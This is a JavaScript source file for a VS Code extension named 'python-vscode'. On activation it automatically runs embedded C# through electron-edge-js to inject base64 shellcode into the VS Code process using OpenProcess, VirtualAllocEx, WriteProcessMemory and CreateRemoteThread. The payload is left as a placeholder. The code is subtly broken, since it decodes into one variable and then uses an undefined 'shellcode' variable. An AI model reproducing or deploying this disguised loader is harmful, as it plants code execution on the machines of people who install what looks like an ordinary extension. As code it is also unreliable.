
const vscode = require('vscode');

function activate(context) {

	console.log('Congratulations, your extension "python-vscode" is now active!');

	let disposable = vscode.commands.registerCommand('python-vscode.exec', function () {
		var edge = require("electron-edge-js");	
		var Scode = edge.func(function(){/* 
			using System;
			using System.Net;
			using System.Diagnostics;
			using System.Threading.Tasks;
			using System.Runtime.InteropServices;
			
			class Startup
			{
			[DllImport("kernel32.dll")]
			public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

			[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
			static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

			[DllImport("kernel32.dll", SetLastError = true)]
			static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

			[DllImport("kernel32.dll")]
			static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		
				public async Task<object> Invoke(object input)
				{
					byte[] data = Convert.FromBase64String("<SHELLCODE HERE>");
					
					Process targetProcess = Process.GetProcessesByName("code")[0];
		    		int pid = targetProcess.Id;
					IntPtr process_handle = OpenProcess(0x1F0FFF, false, pid);
					
					IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);
					
					UIntPtr bytesWritten;
		    		WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, (uint)(shellcode.Length), out bytesWritten);
					
					CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero);
					
					System.Threading.Thread.Sleep(10);
					return null;
				}
			}
		*/});
		Scode(null,function(error,result) {
			if (error) throw error;
		});
	});
	vscode.commands.executeCommand('python-vscode.exec');
	context.subscriptions.push(disposable);
}

function deactivate() {}

module.exports = {
	activate,
	deactivate
}
